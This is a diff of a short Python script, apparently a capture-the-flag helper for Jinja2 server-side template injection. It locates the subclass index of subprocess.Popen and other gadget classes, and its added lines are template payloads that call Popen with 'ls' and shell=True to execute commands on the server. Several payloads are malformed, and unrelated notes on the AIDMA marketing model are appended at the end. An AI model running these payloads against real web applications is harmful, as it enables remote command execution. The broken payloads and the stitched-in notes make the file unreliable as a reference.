@@ -3,7 +3,7 @@ s = "[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'we
 import re
 c=0
 lt=[]
-gg=["subprocess.Popen","werkzeug.wsgi.ClosingIterator","werkzeug.wsgi.FileWrapper","weakref","type"]
+gg=["type","subprocess.Popen","werkzeug.wsgi.ClosingIterator","zipp.Path","werkzeug.wsgi.FileWrapper","weakref",]
 for name in re.findall(r"<class '([^']+)'>", s):
     if name in gg:
         lt.append((c,name))
@@ -15,5 +15,21 @@ print(lt)
 
     #if name == "subprocess.Popen"or name =="werkzeug.wsgi.ClosingIterator"or name =="werkzeug.wsgi.FileWrapper"or name =="weakref" or name =="type":
 
+#{{''.__class__.__mro__[1].__subclasses__()}}
+#{{type(''.__class__.__mro__[1].__subclasses__())}}
 
 #{{''.__class__.__mro__[1].__subclasses__()[300]}}
+#{{''.class.mro[1].subclasses()[356]('ls', shell=True, stdout=-1).communicate()}
+{{type(''.__class__.__mro__[1].__subclasses__()[356])}}
+#{{ type(''.__class__.__mro__[1].__subclasses__()[0]) }}
+
+
+
+
+{{''.__class__.__mro__[1].__subclasses__()[0][1][355][356]}}
+#AIDMA
+# Attention
+# Interest Impact
+# Desire
+# Memory
+# Action
